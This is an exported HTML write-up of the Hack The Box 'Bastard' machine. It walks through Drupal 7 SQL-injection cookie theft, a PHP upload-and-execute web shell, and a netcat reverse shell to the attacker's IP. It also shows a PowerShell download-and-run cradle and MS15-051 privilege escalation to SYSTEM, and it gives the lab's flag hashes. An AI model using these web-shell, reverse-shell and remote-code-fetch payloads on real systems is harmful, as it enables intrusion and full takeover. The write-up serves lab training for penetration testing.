<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>bastard</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="#bastard">bastard</a></p>
<ol>
<li><a href="#nmap ">nmap </a></li>
<li><a href="#http">http</a></li>
<ol>
<li><a href="#gobuster">gobuster</a></li>
</ol>
<li><a href="#initial foothold">initial foothold</a></li>
<ol>
<li><a href="#cookie manager">cookie manager</a></li>
<li><a href="#drupal.php RCE exploit">drupal.php RCE exploit</a></li>
<li><a href="#nc64">nc64</a></li>
</ol>
<li><a href="#privesc">privesc</a></li>
<ol>
<li><a href="#Sherlock.ps1">Sherlock.ps1</a></li>
<li><a href="#MS15-051">MS15-051</a></li>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>bastard</u></b></h1><img alt="images/48-1.png" src="images/48-1.png"/><br/><img alt="images/48-2.png" src="images/48-2.png"/><br/><br/></div>
</body></html><div class="page" id="bastard"><h1><b><u>bastard</u></b></h1><img alt="images/48-1.png" src="images/48-1.png"/><br/><img alt="images/48-2.png" src="images/48-2.png"/><br/><br/></div>
<div class="page" id="nmap "><h1><b><u>nmap </u></b></h1><span style="color:#ffa500;">nmap -sV -sC -oA nmap/bastard 10.10.10.9</span><br/><img alt="images/50-1.png" src="images/50-1.png"/><br/><span style="color:#24ff00;">for reference, Bastard is running<br/>•</span><span style="color:#ffa500;"> Microsoft IIS httpd 7.5</span><span style="color:#24ff00;"> on port </span><span style="color:#ffa500;">80</span><span style="color:#24ff00;"><br/>•</span><span style="color:#ffa500;"> Microsoft Windows RPC </span><span style="color:#24ff00;">on ports </span><span style="color:#ffa500;">135</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">49154</span></div>
<div class="page" id="http"><h1><b><u>http</u></b></h1><span style="color:#24ff00;">Let's navigate to </span><span style="color:#ffa500;">10.10.10.9 </span><span style="color:#24ff00;">since the only service running on the box is http</span><br/><img alt="images/340-1.png" src="images/340-1.png"/><br/><img alt="images/340-2.png" src="images/340-2.png"/><br/></div>
<div class="page" id="gobuster"><h1><b><u>gobuster</u></b></h1><span style="color:#ffa500;">gobuster dir -u 10.10.10.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br/><img alt="images/341-1.png" src="images/341-1.png"/><br/><br/><span style="color:#ff0000;">unfortunately</span><span style="color:#24ff00;"> gobuster does not give us much to work with because all the 301 redirects are access denied pages<br/></span><img alt="images/341-2.png" src="images/341-2.png"/><br/><br/>the three 200 status codes link back to the homepage <br/><img alt="images/341-3.png" src="images/341-3.png"/>&amp;<img alt="images/341-4.png" src="images/341-4.png"/><br/>and a link to create a non admin account<br/><img alt="images/341-5.png" src="images/341-5.png"/><br/><br/><img alt="images/341-6.png" src="images/341-6.png"/></div>
<div class="page" id="initial foothold"><h1><b><u>initial foothold</u></b></h1><span style="color:#24ff00;">something to note is that the http service is running </span><span style="color:#ffa500;">Drupal</span><span style="color:#24ff00;">, which is a webservice that is widely known for having vulnerabilities associated with some of its versions<br/></span><img alt="images/1051-1.png" src="images/1051-1.png"/><br/>remember from our nmap scan that bastard is running <span style="color:#ffa500;">Drupal 7</span><br/><br/><span style="color:#ffa500;">searchsploit drupal | grep Remote</span><br/><img alt="images/1051-2.png" src="images/1051-2.png"/><img alt="images/1051-3.png" src="images/1051-3.png"/><br/><br/><span style="color:#24ff00;">copy </span><img alt="images/1051-4.png" src="images/1051-4.png"/>  to our working directory with<br/><span style="color:#ffa500;">searchsploit -m php/webapps/41564.php</span><br/><img alt="images/1051-5.png" src="images/1051-5.png"/><br/><span style="color:#24ff00;"><br/>Checking the contents of our exploit</span><br/><img alt="images/1051-6.png" src="images/1051-6.png"/><br/><img alt="images/1051-7.png" src="images/1051-7.png"/><br/><span style="color:#24ff00;">the exploit SQL injects the server to pull admin credentials as well as his cookie and session info for us to steal,<br/>it then alters and then restores the cache</span></div>
<div class="page" id="cookie manager"><h1><b><u>cookie manager</u></b></h1><img alt="images/1055-1.png" src="images/1055-1.png"/><br/><br/><img alt="images/1055-2.png" src="images/1055-2.png"/><br/><br/>"<span style="color:#24ff00;">session_name</span>": "<span style="color:#ffff00;">SESSd873f26fc11f2b7e6e4aa0f6fce59913</span>",<br/>"<span style="color:#24ff00;">session_id</span>": "<span style="color:#ffff00;">ITZtOJopNB_X5SQ4W7w0viONRJ05Qjhzq1CRYSHuOMk</span>",<br/>"<span style="color:#24ff00;">token</span>": "<span style="color:#ffff00;">GLsIJM2QxhJXNH-vSoLXjpmu_zWro5aj3vxHWIJZs4A</span>"<br/><br/><img alt="images/1055-3.png" src="images/1055-3.png"/><br/><br/><span style="color:#24ff00;">and the next time we connect to 10.10.10.9, we send the </span><span style="color:#ffff00;">admin's </span><span style="color:#24ff00;">cookie and log in as them!</span><br/><img alt="images/1055-4.png" src="images/1055-4.png"/><br/><br/></div>
<div class="page" id="drupal.php RCE exploit"><h1><b><u>drupal.php RCE exploit</u></b></h1><br/><br/><br/><strong><span style="color:#24ff00;">Add php upload and execute methods to php script:</span></strong><br/>this version of ippsec's fupload and fexec functions are correct syntax and will be properly uploaded <br/><br/>$phpCode = &lt;&lt;&lt;'EOD'<br/>&lt;?php if (isset($_REQUEST['fupload'])) {<br/>    file_put_contents($_REQUEST['fupload'], file_get_contents("<a "="" href="http://10.10.14.13/">http://10.10.14.13/"</a> . $_REQUEST['fupload']));<br/>};<br/>if (isset($_REQUEST['fexec'])) {<br/>   echo "&lt;pre&gt;" . shell_exec($_REQUEST['fexec']) . "&lt;/pre&gt;";<br/>};<br/><br/>?&gt; <br/>EOD;<br/><br/><img alt="images/51-1.png" src="images/51-1.png"/><br/><br/><br/><br/><span style="color:#24ff00;">point to </span><span style="color:#ffa500;">10.10.10.9/rest</span><br/><img alt="images/51-2.png" src="images/51-2.png"/><br/><br/><img alt="images/51-3.png" src="images/51-3.png"/><br/><span style="color:#24ff00;"><br/>if uploading</span><span style="color:#ffa500;"> drupal.php's</span><span style="color:#24ff00;"> php code into the server is giving you </span><span style="color:#8b6914;">problems</span><span style="color:#24ff00;"> and you don't want to waste a lot of time troubleshooting the correct php syntax, you can </span><span style="color:#ffff00;">upload it as a webadmin as well</span><br/><br/><span style="color:#24ff00;">first you have to enable php modules</span><br/><img alt="images/51-4.png" src="images/51-4.png"/><br/><img alt="images/51-5.png" src="images/51-5.png"/><br/><span style="color:#24ff00;">create a new </span><span style="color:#ffa500;">article</span><br/><img alt="images/51-6.png" src="images/51-6.png"/><br/><span style="color:#24ff00;">change the text format to </span><span style="color:#ffa500;">php</span><br/><img alt="images/51-7.png" src="images/51-7.png"/><br/><span style="color:#24ff00;">and inject the code through the article</span><br/><br/><img alt="images/51-8.png" src="images/51-8.png"/><br/><img alt="images/51-9.png" src="images/51-9.png"/><br/><br/><img alt="images/51-10.png" src="images/51-10.png"/><br/><br/><span style="color:#24ff00;">now navigate to the node your article is written to and you have</span><span style="color:#ffff00;"> code execution<br/></span><img alt="images/51-11.png" src="images/51-11.png"/><br/><img alt="images/51-12.png" src="images/51-12.png"/><br/><img alt="images/51-13.png" src="images/51-13.png"/></div>
<div class="page" id="nc64"><h1><b><u>nc64</u></b></h1><span style="color:#24ff00;">find</span><span style="color:#ffa500;"> netcat 1.11</span><span style="color:#24ff00;"> windows executable </span><a href="https://eternallybored.org/misc/netcat/">here</a><br/><img alt="images/52-1.png" src="images/52-1.png"/><br/><br/><span style="color:#24ff00;">now that our </span><span style="color:#ffa500;">fexec</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">fupload</span><span style="color:#24ff00;"> php functions are uploaded and running </span><span style="color:#ffff00;">RCE</span><span style="color:#24ff00;"> for us, its time to use them both to download our netcat executable and run it to spawn a reverse shell back to our attack machine</span><br/><br/><span style="color:#ffa500;">10.10.10.9/steve.php?fupload=nc64.exe&amp;fexec=nc64.exe -e cmd 10.10.14.62  4444</span><br/><img alt="images/52-2.png" src="images/52-2.png"/><br/><br/><img alt="images/52-3.png" src="images/52-3.png"/><br/><img alt="images/52-4.png" src="images/52-4.png"/><br/><br/><br/><span style="color:#24ff00;">and we have our </span><span style="color:#ffff00;">foothold</span><span style="color:#24ff00;">!</span><br/><img alt="images/52-5.png" src="images/52-5.png"/><br/><img alt="images/52-6.png" src="images/52-6.png"/></div>
<div class="page" id="privesc"><h1><b><u>privesc</u></b></h1>lets enumerate some potential vulnerabilities with windows-exploit-suggester<br/><br/>to do that we just need to save a text file of our victim's sysinfo output and run it against windows-exploit-suggester<br/><img alt="images/1052-1.png" src="images/1052-1.png"/><br/><img alt="images/1052-2.png" src="images/1052-2.png"/><br/><br/><br/><br/><span style="color:#ffa500;">python windows-exploit-suggester.py -i /root/Documents/htb/boxes/bastard/sysinfo -d 2020-09-23-mssb.xls</span><br/><img alt="images/1052-3.png" src="images/1052-3.png"/><br/><img alt="images/1052-4.png" src="images/1052-4.png"/><br/><br/></div>
<div class="page" id="Sherlock.ps1"><h1><b><u>Sherlock.ps1</u></b></h1><span style="color:#24ff00;">Shecklock is a great privilege escalatation tool we can showcase on this writeup as well,</span><br/><img alt="images/54-1.png" src="images/54-1.png"/><br/><br/><span style="color:#ffff00;">don't forget to add </span><img alt="images/54-2.png" src="images/54-2.png"/> at the end of our Sherlock.ps1 script!<br/><br/><span style="color:#24ff00;">to download and run it, run the following </span><br/><span style="color:#ffa500;">http://10.10.10.9/steve.php?fexec=echo IEX(New-Object Net.Webclient).downloadString('http://10.10.14.62:8000/Sherlock.ps1') | powershell -noprofile -</span><br/><img alt="images/54-3.png" src="images/54-3.png"/><br/><img alt="images/54-4.png" src="images/54-4.png"/><br/><img alt="images/54-5.png" src="images/54-5.png"/><br/><span style="color:#ffa500;">Sherlock</span><span style="color:#24ff00;"> scans for and outputs a bunch of vulnerabilities we can utilize to escalate our privileges</span><br/><br/><br/></div>
<div class="page" id="MS15-051"><h1><b><u>MS15-051</u></b></h1><span style="color:#24ff00;">Lets use </span><span style="color:#ffa500;">MS15-051</span><br/><img alt="images/55-1.png" src="images/55-1.png"/><br/><img alt="images/55-2.png" src="images/55-2.png"/><br/><span style="color:#24ff00;">lets upload </span><span style="color:#ffa500;">MS15-051</span><span style="color:#24ff00;"> from our working directory and run netcat to call back to us with root permissions</span><br/><br/><span style="color:#ffa500;">10.10.10.9/steve.php?fupload=ms15-051.exe&amp;fexec=ms15-051.exe whoami</span><br/><br/><img alt="images/55-3.png" src="images/55-3.png"/><br/><br/><strong><span style="color:#ffa500;">10.10.10.9/steve.php?fupload=ms15-051.exe&amp;fexec=ms15-051.exe “nc64.exe -e cmd 10.10.14.62 9001"</span></strong><br/><br/><img alt="images/55-4.png" src="images/55-4.png"/><br/><img alt="images/55-5.png" src="images/55-5.png"/><br/><img alt="images/55-6.png" src="images/55-6.png"/><br/><br/><span style="color:#24ff00;">and we're </span><span style="color:#ffff00;">system</span><span style="color:#24ff00;">!</span><br/><img alt="images/55-7.png" src="images/55-7.png"/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/53-1.png" src="images/53-1.png"/><br/><span style="color:#ffff00;">ba22fde1932d06eb76a163d312f921a2<br/><br/></span><img alt="images/53-2.png" src="images/53-2.png"/><br/>4bf12b963da1b30cc93496f617f7ba7c<br/><br/><br/><br/></div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><img alt="images/1452-1.png" src="images/1452-1.png"/></div>
</div></body></html>